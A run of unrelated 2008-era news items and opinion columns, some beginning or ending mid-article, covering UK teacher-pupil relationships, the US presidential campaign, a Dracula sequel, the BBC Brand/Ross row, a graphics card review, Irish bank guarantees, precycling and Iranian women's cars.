' If there is no penalty what is there to stop teachers taking advantage of children and young people ?
' This also sends out a message that this is ok for teachers to have a relationship with pupils . '
The mother of six , who is a former teacher , added : ' Children deserve our protection and we should expect a standard of behaviour in that position of responsibility that should be rigorously enforced in law . '
In 2001 the law was changed to make it illegal for teachers to have affairs with their pupils under the age of 18 .
But a study by Sheffield University published in 2005 estimated that as many as 1,500 intimate relationships develop every year .
Dean Dainty , who was 16 when he had a sexual relationship with his 22 - year - old drama teacher Nicola Prentice , says the teacher 's abuse of her position wrecked his life .
In an interview for the programme he said : ‘ Looking back now , I wish it had never all happened .
It affected me in a big way , my personality and things , and I started to do stupid things after it and not be myself .
' It took me a long time to get myself back together – I suppose it took a piece of my life away really . ’
Prentice received a suspended sentence and was made to sign the sex offenders register .
Yesterday Margaret Morrissey , from the campaign group Parents Outloud , said : ' It is wrong for a teacher to have a relationship with a student in their school , even one over the age of consent .
' I would have been less than impressed if a male teacher had started a relationship with my daughter while she was at school .
However , there is a question as to whether they should be classed as a paedophiles and a risk that labelling them as such devalues the term . '

State police say an upstate New York college campus policeman was helping himself to free pastries at a local convenience store .
The Valero Nice N Easy offers free coffee to any police officer in uniform .
Sgt. Steve Brody of the Morrisville State College University Police stopped daily to buy a newspaper and pick up a free cup of coffee .
He also routinely stuffed a pastry into his coat .
Brody is now accused of taking about $ 30 worth of pastries over at least 17 separate occasions .
Brody , 55 , of Morrisville , was ticketed for petit larceny .
Troopers say they have surveillance videos .
Brody and his defense attorney declined to comment .
Brody remains an employee at Morrisville ; school officials say the case is a personnel matter and refused further comment .
PRINCETON , NJ -- Gallup polling in October finds little evidence of a surge in young voter turnout beyond what it was in 2004 .
While young voter registration may be up slightly over 2004 , the reported level of interest in the election and intention to vote among those under 30 are no higher than they were that year .
What 's more , 18 - to 29 - year - olds continue to lag behind Americans aged 30 and older on these important turnout indicators .
As a result , 18 - to 29 - year - olds now constitute 12 % of Gallup 's traditional likely voter sample , basically the same as the estimate in the final 2004 pre-election poll ( 13 % ) .
Gallup 's expanded likely voter model , which defines likely voters differently ( on the basis of current voting intentions only ) , estimates a slightly higher proportion of young voters in the electorate ( 14 % ) .
However , even if the share of the youth vote were adjusted upward , doing so has little or no impact on the overall Obama - McCain horse - race numbers using either likely voter model .
It is possible that the 18 - to 29 - year - old share of the likely voter electorate will grow in the final days of the election .
Although interest in the election and voting intentions usually increase as Election Day grows nearer , Gallup did not observe much of an increase from mid- to late October 2004 , because interest was already at high levels ( as it is this year ) .
A second possibility for heightened youth turnout would be voter mobilization efforts .
Such efforts can convince people with little motivation or interest in the campaign to actually vote on Election Day .
Gallup has been measuring voter contact in its daily tracking poll this week in an effort to gain a better understanding of this important component of the " ground game " in the final days of the campaign .
As of Oct. 27-29 polling , 39 % of 18 - to 29 - year - olds had been contacted by either the Obama or McCain campaigns .
That is the same contact rate seen among 30 - to 49 - year - olds , but is well below that of Americans 50 and older .
So thus far , in a general sense , mobilization efforts have not reached the young voters to the same extent that they have older voters .
The overall contact rates by age hide a significant disparity in contact by the two campaigns .
Americans under 30 are about twice as likely to report having been contacted by the Obama campaign as by the McCain campaign .
Thirty - one percent of 18 - to 29 - year - olds have been contacted by the Obama campaign , compared to just 16 % who say the McCain campaign has contacted them .
The rate of Obama campaign contact of young adults compared to those who are older is similar , ranging from 31 % among younger Americans to 40 % for those 65 and older .
On the other hand , there is a much larger age skew in reported contact by the McCain campaign , ranging from just 16 % for the younger group to 38 % for those 65 and older .
The higher contact rates for Obama among the younger group reflect his greater level of support among this group than among the general population , a fact that has been well - documented .
These contact levels for younger voters no doubt reflect that each candidate 's campaign this year appears to be targeting its contact toward its known supporters -- reflecting the strategic decision that voter contact best serves to reinforce the base and get out the vote rather than to attempt to change voters ' minds .
Plus , given the historic fact that younger voters are less likely to turn out at the polls and vote , it may be that the Obama campaign sees a fertile opportunity among this group for increased votes .
The graph also makes clear that the Obama campaign has been more successful in reaching voters , regardless of their age .
Implications
While Gallup data do suggest that voter turnout among young people will be high this year ( as it was in 2004 ) compared to historical turnout rates , the data do not suggest that it will be appreciably higher than in 2004 .
Even if more young voters are registered this year , they do not appear to be any more interested in the campaign or in voting in the election than they were in 2004 .
Unless turnout rates among older age groups drop substantially from what they were in 2004 , young voters should represent about the same share of the electorate as in the last presidential election .
And Gallup 's data suggest interest in the campaign and voting are the same or higher among older voters compared to what they were in 2004 .
Gallup will continue to monitor campaign contact between now and the end of its pre-election polling , to see whether that could be a factor in promoting higher turnout among voters this year .
Survey Methods
Results are based on telephone interviews with 2,279 national adults , aged 18 and older , conducted Oct. 10 - 12 and Oct. 23 - 26 , 2008 .
For results based on the total sample of national adults , one can say with 95 % confidence that the maximum margin of sampling error is ±2 percentage points .
For results based on the sample of 237 18 - to 29 - year - olds , the maximum margin of sampling error is ±7 percentage points .
Interviews are conducted with respondents on land - line telephones ( for respondents with a land - line telephone ) and cellular phones ( for respondents who are cell - phone only ) .
In addition to sampling error , question wording and practical difficulties in conducting surveys can introduce error or bias into the findings of public opinion polls .
Serious Comment : The 2008 Vice Presidential Debate
Was the VP debate a game changer ?
byEditor Satire and Comment
( Atlanta - Oct 3 2008 ) Barack Obama is a great orator with a broad outlook and reasonable but not tremendous experience .
John McCain is highly experienced and widely admired .
But his reputation for having a hot - temper and a tendency to make erratic decisions damages him .
So did the VP debate help either of them secure their position in the presidential election ?
Governor Palin did well in the debate .
Instinctively likeable , many people recognize that they know someone just like her , the multitasking mother and career woman .
The expectations for the debate were very low for her , indeed there was palpable fear that she might crash and burn after her stumbling performance with Katie Couric during the week .
However she made no real mistakes and proved she is capable - albeit deeply unprepared beyond a few core experiences challenging the oil industry in Alaska .
When she addressed issues she came across as self assured but scripted and trained rather than inherently knowledgeable , reverting regularly back to slogans .
Those who were going to vote Republican were reassured but those on the fence will lean away from her because her performance reinforced that she had never thought of the world beyond her Alaskan borders until 5 weeks ago when she was selected .
She tried hard but it 's going to be a few years before she can speak with confidence about issues of national importance .
So the debate will have damaged her if the public does not have the stomach for another President who needs to learn on the job - and with Mc Cain getting visibly older there is a very real chance Palin will be the first woman President if the Republican ticket succeeds .
McCain 's pick of Palin was inspired and admirable .
This choice has pushed forward dramatically the position of women in the United States .
That alone would be a great legacy for McCain .
If she had more experience then McCain / Palin would have the election in the bag .
But her inexperience , reinforced in the debate , combined with recent damaging erratic behavior from McCain around the bailout proposal make the combined ticket look weak .
Biden also did very well .
Although his name is known for a long time , very few people are actually familiar with him other than his own constituents and political pundits .
He came across as sincere , experienced and knowledgeable .
His struggle to hold back tears when reflecting on a personal tragedy humanized him .
In answering a question on what he thought of the VP role he very intelligently described how he would be a trusted advisor to Obama while being resolutely not a yes - man .
He came across as someone who will be an invaluable asset to shore up Obama 's relative inexperience and at the same time he came across as one who would make a very solid President if needed .
So the choices the electorate recognizes after the debate are :
Experienced , admired but erratic hot tempered old man who has a deeply inexperienced running mate who may become President before she is ready
Inexperienced but highly capable young man with very experienced advisor who would make a solid President if needed .
One would expect that any undecided independent or fence sitting Hillary supporters will now move solidly to Obama .
Will that be enough to win ?
If McCain does not win , the VP debate will , in this writer 's opinion , have been the game changer that solidified the position of those who were unsure about making the leap to Obama and pushed them to finally commit to vote for him .
For Palin , should she lose in this election , she would be well advised to run for the Senate or some other office or high profile private sector role .
This will give her national and international experience and open the chance to try again in 8 or 12 years .
She has a strong future in the public eye but objective analysis leads to the inevitable conclusion that she is not ready today to lead the country if needed .
Of course not being ready does not mean she will not get elected !

Bela Lugosi in Dracula ( 1931 ) .
Photograph : Kobal
Van Helsing and his intrepid band of vampire hunters might have disposed of Bram Stoker 's creation Dracula more than a century ago , but a sequel to the novel by Stoker 's great grand - nephew will see them under attack from the undead once again .
Dacre Stoker delved into his ancestor 's handwritten notes on the original Dracula novel to pen his sequel , Dracula : The Un - Dead - the original name for Dracula before an editor changed the title .
The novel , out next October , draws on excised characters , existing character back - stories and plot threads that were cut from Stoker 's original novel , first published 111 years ago .
The new book is set in London in 1912 , a quarter of a century after the Count apparently " crumbled into dust " .
Vampire - hunter Van Helsing 's protégé Dr Seward is now a disgraced morphine addict , and Quincey , the son of Stoker 's hero Jonathan , has become involved in a troubled theatre production of Dracula , directed and produced by Bram Stoker himself .
The play plunges Quincey into the world of his parents ' terrible secrets , but before he can confront them his father is found murdered , impaled in Piccadilly Circus .
The original is written in classic epistolatory form , alternating between different narrators ; the sequel adopts a more direct storytelling route .
" [ This ] makes it more immediately accessible to a modern thriller readership , while remaining faithful to the spirit and atmosphere of the Victorian original , " said publisher Jane Johnson of HarperCollins UK .
The book has caused a storm in the publishing world , selling for more $ 1 m to Dutton US , HarperCollins UK and Penguin Canada .
A film version is also in the works , with shooting expected to begin next June .
Dacre Stoker , who formerly coached the Canadian Olympic Pentathlon team and now lives in the US , is writing the novel with Dracula historian Ian Holt , a screenwriter and member of The Transylvanian Society of Dracula .
The Un - Dead is the first Dracula story to be fully authorised by the Stoker family since the 1931 film starring Bela Lugosi .
Stoker , speaking to guardian .
co.uk from a fishing trip in Tennessee , said he had initially been " a little sceptical " about the project to resurrect Bram Stoker 's original themes and characters , which was dreamed up by Holt .
" Growing up , all the Stokers in my generation were pretty blasé about the fact we were related to this great horror writer .
At Halloween we'd get all these comments about ' are we going to get bitten if we go round to the Stokers ? ' , " he said , admitting that he only got around to reading his great grand - uncle 's novel when he went to college .
" But Ian seemed to be the real deal . "
Stoker and Holt say they have each written equal amounts of the novel .
" When we started I was worried because Dacre had never written a novel before , but he was great , " Holt said .
" I think I 've got a little bit [ of my ancestor 's skills ] in the bloodline , " said Stoker , who spent some time researching the London of 1912 in order to write the book .
" We really needed to do the detail the way Bram did - we owed it to him , " he said .
" At times we felt in a weird way that Bram was there with us as a third author , " added Holt .
" We had his notes , and the stories and legends passed down through the family - we were able to give him back his legacy - reclaim Dracula for his roots . "
Stoker agreed .
" Our intent is to give both Bram and Dracula back their dignity .
Maybe even more important is to give the novel 's legions of loyal fans what they have been waiting over a century for ... the return of the real Dracula . "
Stoker 's original Dracula , the forefather of the wave of vampire novels currently flooding the bookshops , has never been out of print since it was published in 1897 .
The sequel will be competing with two other high profile vampire novels published next year : film director Guillermo del Toro 's debut The Strain , about a vampiric virus which invades New York , and Justin Cronin 's The Passage , about a vampire plague spawned by medical experiments .

The Pulitzer Prizes are the most prestigious journalistic awards in the world and winning any of these awards is as big an honor as a journalist can achieve .
The 2008 Pulitzer Prizes were just announced and in the category of “ Breaking News Photography ” the winner is Adrees Latif of Reuters , a Pakistani - born , Bangkok - based news journalist .
The photograph that won him this honor ( below ) is of “ a wounded Japanese photographer , Kenji Nagai , as he lay before a Burmese soldier in Yangon , Myanmar , as troops attacked protestors . ”
Mr. Nagai later dies .
The photograph was published by Reuters on September 28 , 2007 .
According to the Pulitzer Prize website , the category in which Adrees Latif has won is for “ a distinguished example of breaking news photography in black and white or color , which may consist of a photograph or photographs , a sequence or an album , in print or online or both , Ten thousand dollars ( $ 10,000 ) . ”
His citation reads :
Awarded to Adrees Latif of Reuters for his dramatic photograph of a Japanese videographer , sprawled on the pavement , fatally wounded during a street demonstration in Myanmar .
The biography of Adrees Latif , also according to the Pulitzer Prize website , reads :
Born in Lahore , Pakistan on July 21 , 1973 , Adrees Latif lived in Saudi Arabia before immigrating with his family to Texas in 1980 .
Latif worked as a staff photographer for The Houston Post from 1993 to 1996 before joining Reuters .
Latif graduated from the University of Houston in 1999 with a Bachelor of Arts in Journalism .
Latif has worked for Reuters in Houston , Los Angeles before moving to Bangkok in 2003 where he covers news across Asia .
We at ATP are happy that at least we can spot talent – we have , in fact , been using one of his photographs as a front page splash image for a while ( it is up now as the Front Page splash and on the left ) .
Readers would remember , that earlier Ali Khurshid – another Pakistani photographer – had been honored by Time magazine ; in that case too , we at ATP had featured his work well before Time did .
Here is the picture from Adrees Latif we have been using since the elections :
The Reuters website will take you to more pictures from Adrees Latif , some of which are reproduced below :
A more detailed report from the Houston Chronicle recounts more about the photograph and the Adrees :
Ten days on , and the 18 October edition of Russell Brand 's BBC radio show has gained an after - life all its own .
The outline by now is well known .
Mr Brand , along with his fellow entertainer Jonathan Ross , left a series of crude messages on the answering machine of the 78 - year - old actor Andrew Sachs , which were played in their entirety on the programme .
Complaints from Mr Sachs 's agent produced only a jocular and ambivalent apology from Mr Brand .
Then the story hit newspapers and all hell broke loose .
Two complaints to the BBC swelled to 10,000 ; the BBC apologised and announced an inquiry ; Ofcom said it was launching an investigation ; the BBC Trust requested a report .
The Prime Minister condemned the duo's behaviour as " inappropriate and unacceptable " .
Who next ?
The secretary general of the UN ?
Yet what actually happened ?
A couple of weak jokes , undreamt - of publicity for Mr Sachs 's granddaughter , and an apology that could have laid the whole farrago to rest .
Now there can be little doubt that the routine was coarse , juvenile and vindictive , and the language used in respect of the grand - daughter was obscene .
But it is precisely this edginess , this pushing of boundaries , that draws listeners to Russell Brand 's shows .
This broadcast might have pushed the boundaries somewhat further than others .
But of those who tuned in – an estimated two million – only two apparently felt strongly enough to complain .
There is an unfortunate element of " Disgusted of Tunbridge Wells " in the subsequent flood of apoplexy .
The truth is that regular listeners seemed to take the offensiveness in their stride .
Download the new Independent Premium app Sharing the full story , not just the headlines
This raises two questions .
The first is whether the licence - funded BBC should be hiring the likes of Russell Brand and Jonathan Ross , at vast expense , to broadcast the sort of material so many people – we would venture to say most – find offensive .
The fact that a self - selected late - evening audience finds the programme entertaining , and the BBC arguably attracts a wider audience to BBC Radio 2 as a result , does not invalidate the question .
Is this the sort of thing a public service broadcaster should be doing ?
The bigger question concerns the BBC 's accountability .
Its apology on Monday seemed to reflect more a fear of sections of the press than a proper sense of moral obligation .
From day one , the corporation has behaved with that confused combination of formality and buck - passing we know so well from the saga of Andrew Gilligan and the Today programme and the distorted editing of the documentary The Queen .
Something that should have a simple answer – what was the chain of editorial responsibility and who signed off on the pre-recorded show ?
– requires a full - blown inquiry .
No BBC executive spoke out either in defence or condemnation of the programme .
So far , the only name in the frame is that of a very junior editor .
The BBC has enormous departments , long chains of editorial authority and large numbers of highly paid executives who routinely receive " performance " bonuses .
Yet when something goes wrong and legitimate questions are raised , every which one of them vanishes into the ether , with the occasional honourable exception , such as Gavyn Davies or Peter Fincham .
This reluctance by the publicly funded broadcaster to take responsibility is , ultimately , more distasteful than what went out on its airwaves .
If a leaner BBC is too much to ask in the short term , a more responsible Corporation should be imperative .
With the launch of the Radeon HD 4870 , AMD showed us that they are not only still in the game , but they are back .
Their hardware either out performed or was on par with NVIDIA hardware priced significantly higher .
As a result , NVIDIA was forced to significantly adjust their prices downward to remain competitive .
And , currently , they are competitive in terms of pricing and performance .
But in this business competitive is n't always good enough .
AMD came out of the gate swinging for a knock out .
And they did a good job of winning a significant amount of mindshare .
They built a good product and priced it very aggressively at launch .
While our concern is the current state of things , and our recommendation will be for the part that gives our reader the best value , that 's not how every graphics card enthusiast sees it .
The things companies do ( like initially selling their hardware at way too high a price ) can significantly affect the position of some enthusiasts .
That might be one reason NVIDIA went down the core 216 path with the GTX 260 .
A name more like GTX 265 would have been nice , and we already talked about how much we do n't need dozens of parts all with slight tweaks and price differences cluttering up the market .
But , the core 216 did help make NVIDIA 's hardware more competitive ( even if it did n't put it over the top ) .
And more competitive is a good thing .
Better competition does nothing but benefit the consumer , and we love to see it .
If NVIDIA took that step because they want to win back some mindshare then that 's fine with us .
All we care about is what performs best in a price class , because that is what benefits our readers .
Of course , the core 216 might also have been anticipating the eventual availability of the Radeon 4870 1GB .
In which case , the core 216 falls short .
Well , it is n't just that the GTX 260 falls a little short .
The fact is that the extra RAM really does make a significant difference in many high quality high resolution situations when playing current games .
We did n't expect the gains we see here , and combined with the original stellar performance of the Radeon HD 4870 , we have to say that we are impressed .
The Radeon HD 4870 1GB has the same number of GDDR5 chips on board , but the devices on the 1GB model are double the density of the 512MB part .
Yes , these are different parts .
The top one is the 512MB version and the bottom one is the 1GB .
The 512MB card we have uses Qimonda GDDR5 , while the 1GB model we tested has Hynix devices .
As GDDR5 is still pretty new , it is likely that the delay in getting out the 1GB model of the 4870 had to do with delays in getting a high enough supply of high density RAM .
Anyway , we mentioned that the GTX 260 core 216 does n't quite keep up now that the 4870 has twice as much RAM .
Let 's take a look ath exactly how short it falls , first in terms of how much performance we gain over the original model and then in absolute terms .
The plan pledges to guarantee the liabilities of six Irish - owned banks totaling some 400 billion euros ( $ 565 billion ) , more than twice the country 's annual gross domestic product .
" The decision , if left to stand … my prophecy is it will bring down the currency .
The euro is not a tenable currency if you have politicians making such decisions .
The reality is there is no such thing as a free lunch , " Hendry told " Squawk Box Europe . "
" If I was German , I would say give me back my Deutschmarks , " he added .
( Watch Hugh Hendry and Charles McKinnon , CIO of Thurleigh Investment Management , on CNBC above ) .
On Thursday , Irish lawmakers backed the plan and the government said it may be extended to foreign banks with retail units in Ireland , but it has raised questions in Brussels and London about competition and state - aid rules .
Promises of lavish spending such as this and others being discussed in Europe will erode investors ' confidence , Hendry warned .
" McDonalds has got less chance of going bust than the British government , " he said .
" When our government comes to issue this sea of money they 're going to pay through the nose … if we can't constrain that behavior , we 're going to pay for it . "
" We 're on the verge of a sovereign debt default in Europe . "
The current crisis stems from central banks easing monetary policy and flooding markets with liquidity to kick - start the economy after the dot - com bust in 2000 , Hendry said .
" The reality is we should have had a stinking recession at the turn of the century .
We burnt and destroyed lots of capital , we should have suffered from it , " he said , adding that former Federal Reserve chairman Alan Greenspan thought he could " abolish the economic cycle " by inflating house prices .
Currently , Hendry owns " bonds , government bonds , " and he might be " contemplating selling my gold equity shares , " he said .

In his second new TV spot of the day — this one now playing in Pennsylvania — Barack Obama takes a strong stand against Big Oil , saying he “ wo n’t let them block change anymore . ”
Senator Obama stands at a gas station and speaks directly into the camera for the duration of the 30 - second spot .
( Must be his new style — he takes a similar direct approach in his Indiana ad . )
Mr. Obama goes after Exxon Mobil in particular .
in the ad , which starts off with old footage of cars lined up for gas at an Exxon station back in the 1970s .
People cried out for energy independence back then , Mr. Obama says , and “ nothing ’s changed — except now Exxon ’s making $ 40 billion a year , and we ’re paying $ 3.50 for gas . ”
But he ’s going to do something about it , he says .
Mr. Obama proposes putting a tax on the windfall profits of oil companies , and he says he ’ll end American dependence on foreign petroleum .
He can take aggressive steps against Exxon Mobil , he points out , because he has n’t accepted donations from oil companies or lobbyists .
“ It ’s time that Washington worked for you .
Not them , ” he says .
Hillary Rodham Clinton ’s campaign was quick to send out an e-mail accusing Mr. Obama of making false statements in his ad , saying he has received more than $ 160,000 from the oil and gas companies .
Phil Singer , deputy communications director for Mrs. Clinton , put out this statement : “ It ’s unfortunate that Senator Obama is using false advertising to explain why he can be trusted to do something about energy prices .
Senator Obama says he does n’t take campaign contributions from oil companies , but the reality is that Exxon Mobil , Shell and others are among his donors .
I wonder if they ’ll fix the ad . ”
Mr. Singer should n’t hold his breath .
Bill Burton , press secretary for the Obama campaign , reaffirmed the ad ’s message , saying “ Senator Obama is the only candidate in the race who does n’t accept campaign contributions from special interests PACs and Washington lobbyists , and that includes oil companies and oil lobbyists . ”
“ The energy bill that Senator Clinton has already been criticized for misrepresenting — one that Clinton supporters Representatives Murtha and Kanjorski also backed — actually raised taxes on oil companies and made the largest investment in renewable energy in our nation ’s history , ” said Mr. Burton in a statement .
“ Instead of continuing with the negative and misleading tactics that voters everywhere are rejecting , Senator Clinton should get behind the Obama plan to ease the burden of rising gas prices on working families . ”
Here ’s the script for “ Nothing ’s Changed ” :
Recyling is good , but precycling - cutting out packaging in the first place and buying only what you need - is better .
Tanis Taylor tried it for a month
Every Tuesday , as a house , we put out two big green boxes of recycling .
I say green because a ) they literally are and b ) the presumption is that by using them , so are we .
But would n't it be greener not to put out the recycling - to generate so little waste that , come Tuesday , there is nothing to put in the green box ?
It is an idealistic notion , but is it practical ?
I decided to try it for a month to find out .
And in doing so , I inadvertently discovered that I 'd joined a movement .
Precycling is the practice of reducing waste by attempting to avoid accumulating it in the first place .
Precyclers try to cut out as much packaging as possible and , to this end , they think ahead , shop locally , buy things loose and bring their own containers .
The benefits are various ; from saving money and creating less landfill to reducing food miles and conserving natural resources .
The term was coined in 1988 for a waste awareness campaign in Berkeley , California .
Residents were encouraged to avoid single - use items and to buy in bulk .
Affectionately known as " wombles " , they refused junk mail , carried precycling " kits " ( such as cloth sandwich bags and cutlery ) and when the internet came , they did their reading online to cut down on pulp .
Today , however , precycling is generating interest among the eco-aware .
In its report in May , the US market research firm Intelligence Group found that half of all consumers thought about an item 's reuse or resale cost before purchase , that 45 % of US trendsetters and 14 % of mainstream consumers have cut down on bottled water purchases and 49 % and 16 % respectively have cut down on the use of plastic bags .
In the UK , financially concerned and environmentally aware consumers are turning to tap over bottled water and carrying canvas shopping bags ; Sainsbury 's is even reporting a 36 % rise in its sales of lunchboxes .
UK households throw away 5.9 m tonnes of packaging every year , 4.7 m tonnes of which is food related .
Recyling is a greener option - saving between 25 % and 90 % of the energy it would take to create new products - but there is still an environmental cost .
Recycling a plastic bottle takes a lot of time and energy ; washing it under the tap does not .
The key to being a good precycler is being prepared .
This I learn on day one of my trial when I forget to bring my lunch to work and am reduced to eating fruit and ice - cream ( the cone being the ultimate in edible packaging ) .
The following day , I get organised : daily sandwiches ( in a washable sandwich wrap ) , a travel mug , cloth shopping bags and a water bottle are on hand at all times .
Gone are the impulse , convenience shopping sprees of old - to be replaced by an intentional , almost military approach to what I need to buy and from where .
I patronise local markets , fishmongers , butchers and bakers and rediscover the joys of having bottles of milk delivered to my doorstep ( milk and orange juice bottles can be reused 20 times before they are recycled ) .
There is a nostalgic , parochial pleasure that comes from asking bemused staff at Costa Coffee to fill up my china mug , of carrying apples in a paper bag and using a handkerchief to blow my nose .
It speaks of gentler times , a greater custody of care , and thoughtful , less harried , consumption .
It saves me money and encourages experimentation .
I make bread and cook strange recipes in a kitchen clear of jostling brands .
However , convenience food is aptly named .
Buying unpackaged is , initially , hugely inconvenient .
Finding naked staples takes real tenacity , but they do exist .
Shops such as Unpackaged in north London sell dried goods in open bins , beside loose toilet rolls and a small line in refillable juices and cosmetics - and give you a discount when you bring your own container .
Rural and city farms are alive and well , and great for eggs and dairy , while farmers ' markets and box schemes provide your five - a- day .
For pulses and staples , ethnic high street stores such as Green Valley , off the Edgware Road in London , are bulk - buy havens - with sacks and spice bins of jarish and Lebanese thyme next to tubs of cashews , apricots , figs and dried sharon fruits .
At the lower - budget end of the spectrum , Weigh & Save outlets can still be found on the outskirts of some towns , where you can stroll through aisles of ginger cake - mix , pearl barley and dried dog food , buying only as much as you need by the gram .
Meanwhile , shopkeepers in smaller , artisan shops , such as the Monmouth Coffee Company , have witnessed a bring - your - own revival , with more customers bringing their own jars to be filled .
" People are plumping for less packaging for a variety of reasons , economic and environmental , " says Cath Conway of Unpackaged .
So how did I do ?
During my month , the green halo slipped often .
I still bought my mayonnaise in bottles and tuna in cans and I never did find a solution to the wine issue .
( It is hard to find decanted wine , and I could n't face Wetherspoon 's superchilled draught wine . )
But by the end of the month , my black bin was hardly being used and we were putting out one green bin , a quarter full .
Eventually , says Nimish Shah , a 35 - year - old precycler from London , it will be empty .
Shah has n't been to a supermarket for years .
He shops at small stores and always brings his own bags .
He cuts an eccentric figure at his local market , putting fish fillets in a cloth bag that he washes and reuses .
" When I look at an item , " he says , " the first thing I think is whether I could just do away with the packaging or , failing that , reuse it somehow .
Recycling a product should be the last option really " .

BBC News , Tehran
Iranian women can drive cars but are not allowed to ride motorbikes Iran has announced plans for a new car designed specially for women .
Its features will include automatic transmission , parking and navigation aids and a jack for changing tyres without getting grease on your chador .
Iran 's biggest car producer , Iran Khodro , says it will come in a range of feminine colours and interior designs .
Other features are proposed to make it easier for women when they are doing the family shopping or taking their children to school .
If that suggests a degree of sexist stereotyping in Iranian society , it is , just possibly , true .
Despite the fact that Iranian women now make up around 60 % of university students , Iranian men have yet to absorb fully the message of equality .
A recent study by an academic from Allameh Tabatabaii University in Tehran found that working Iranian women believed that the domestic chores should be shared more equally .
However , according to the report " their husbands think and act traditionally " .
Indeed , the idea of married men cooking for their wives is viewed in Iran as highly eccentric .
As a result , the report concludes , Iran 's new generation of working women " are obliged to play the role of a superwoman to resolve their contradictions in handling all tasks . "
It says such women " have become increasingly frustrated with their life " .
' Modesty bikes '
Officially , President Mahmoud Ahmadinejad insists that Iranian women are the most equal in the world .
And the authorities proudly boast of the achievements and opportunities open to Iranian women .
But the official Iranian concept of equality is very different from that understood by Western feminists .
Among the more eccentric policies here , Iran recently announced plans for a special bicycle for women .
None of the machines has been spotted yet , but apparently the idea is to provide special covers , to help preserve female modesty as they pedal .
Women , however , are still banned from riding motorcycles .
However , they can often be seen perched on the back , sometimes with one or two small children in their arms , as their husband weaves through the Iranian traffic .

Contempt , apathy and lies - why Britain is crying out for our own ' pitbull with lipstick '
Across the Atlantic , Americans have been convulsed by the overnight sensation of Sarah Palin .
At a stroke , this hockeymom ' pitbull with lipstick ' has galvanised John McCain 's presidential ticket and given the Obama Democrats their biggest and maybe insuperable problem .
But her significance does not stop there .
Scroll down for more
Britain needs its own ' pitbull with lipstick ' like U.S. vice - president nominee Sarah Palin
Despite obvious differences between the U.S. and the UK , her triumph carries important lessons for British politics , too .
Palin's storming of the political citadel is the victory of the outsider , the little person who takes on the establishment - and wins .
In Britain and America - as in other parts of the Western world , too - an enormous gulf now yawns between leaders and led .
People have concluded that politicians of all parties seem to inhabit a world apart , governed by self - interest , cynicism , corruption , incompetence , deep contempt for the electorate and an incorrigible instinct to deceive them .
Politicians know this .
Which is why they all purport to stand on a platform of ' change ' .
But change from what to what , precisely ?
Unless there 's a clear answer , ' change ' becomes a pointless soundbite which risks creating an impression of yet more political sleight of hand .
This is the trap into which Barack Obama has fallen .
Yes , he has amazing gifts of charisma and oratory ; along with his youth and black ancestry , this all helps create the impression that he is an outsider and embodies a fresh start .
But , on closer inspection , he looks suspiciously like yet more of the same old same old .
The way he changes his political message to fit the audience he is addressing sits ill with his pitch to represent a new politics of integrity .
And his voting record and positions on social issues place him firmly among the Left - wing elite which has waged such devastating war upon the West 's moral values .
By contrast , Palin has a very strong sense of right and wrong rooted in her evangelical Christian faith .
Perversely , this damns her in the eyes of the Left as the ' hard Right ' .
This is clearly absurd : she is a working mother of five who has shown herself as capable of felling Big Oil and other political cartels against the public interest as shooting moose .
Will David Cameron look for a British ' pitbull with lipstick ' ?
Moreover , her real achievement is to do what the Left assumed was utterly impossible : she makes social conservatism seem attractive .
Not only is she young , attractive , clever , witty and feisty ; her love for her Down 's Syndrome baby embodies hope for the future .
As for her pregnant 17 - year - old daughter 's proposed shotgun wedding , the priority there is the welfare of the unborn child .
By contrast , the ' right to choose ' feminist Left , which also thinks all women have a right to deprive a baby of its father , appears not just callous and selfish , but even downright murderous .
Which is why so - called ' progressives ' on both sides of the Atlantic have gone into paroxysms of rage and panic over Sarah Palin .
For she has taken the supposed characteristics of the Left - youth , dynamism , change , excitement and social conscience - and presented them as conservative virtues .
Since the Left habitually shores up its own position by demonising conservatives as nasty , backward - looking , mean - spirited , lifedenying , prejudiced , stupid and boring , it recognises her as a mortal threat - not just to Obama but to its whole political platform .
Accordingly , it is frenziedly hurling smears and allegations at her .
And maybe she will eventually fall apart under the pressure .
But if she survives this witch - hunt , her crucial role will be to energise McCain 's core vote .
Because - and here 's where British Tories should be paying close attention - McCain is not popular with truly conservative Republicans .
His self - styled mission has been to detoxify the lethally unpopular Republican brand .
He seemed well placed to do so because his opinions crossed party lines and made him attractive to the centre ground .
( Sound familiar ? )
The problem was that in doing so he alienated core Republicans .
His views on man-made climate change ( he believes in it ) , abortion ( he 's a bit iffy ) or immigration ( he 's for it ) made his core voters suspect he was a Democrat in drag .
As a result , the danger was that they would not turn out for him on election day .
And exactly the same danger is lurking for David Cameron .
If conservatively - minded voters want to turf Labour out but have no enthusiasm for the Tories , the risk is they will simply stay at home .
Like McCain and Obama , Cameron too has grasped the public 's anti-establishment mood .
But he made the error of assuming that the reactionary old order to be overturned was conservatism , while change , hope and progress resided on the Left .
But this is a caricature which , although an article of faith among the media , bears scant relation to reality .
It is the Left which upholds the miserable social and educational status quo which causes such misery and harm to so many at the bottom of the heap .
It is the Left which preaches despair by believing that nothing can be done to stop social ills such as crime , drug addiction or teenage pregnancy .
Instead , it sets up vast infrastructures at public expense to mitigate their worst effects - which has the effect of entrenching and deepening those very social ills .
By contrast , any hope of real change for the better lies in the restoration of this country 's tradition of morality rooted in Christian religious conscience , exemplified by the Tories ' Social Justice Commission .
To his credit , Cameron seems to realise this .
Hence his support for marriage and his endorsement of the Commission 's work .
But the message is still too equivocal .
For sure God , guns and abortion do not play out in Britain as they do in America .
But Middle Britain is nevertheless desperate for a champion which it does not yet recognise in the Tory Party .
Middle Britain mourns that its country is being transformed by mass immigration ; it is demonised for saying so .
It is aghast that it no longer governs itself but is becoming a province of Euroland ; it is scorned as xenophobic for saying so .
It is furious that Britain subsidises feckless behaviour through welfare benefits ; it is attacked as heartless for saying so .
It is alarmed that the gay rights agenda is making a mockery of family life ; it is vilified as homophobic for saying so .
And so on .
The Tories are inching towards parts of this agenda .
But unable to rid themselves of the fixation that only the socially liberal Left is attractive , they give out mixed or ambiguous messages - which leave people confused or suspicious that Cameron is just another slippery politician .
And , in today 's world where issues no longer matter as much as personality , that 's lethal .
Despite their very different opinions , McCain and Palin score because they are both mavericks - known to be true to themselves .
What the Cameroons have yet to grasp is that it was not so much conservative measures that the British public rejected , but Tory men .
There are millions who long for a conservative defence of Britain and its values by a leader they respect and admire .
Sarah Palin may well turn out to be Middle America 's revenge on its elites .
Middle Britain is watching - and hoping that it will now be hunting season against the moose of the British Left , too .
The probe into the Rev. Al Sharpton ’s finances intensified this week , with the IRS sending out a flurry of subpoenas to his most generous corporate donors , The Post has learned .
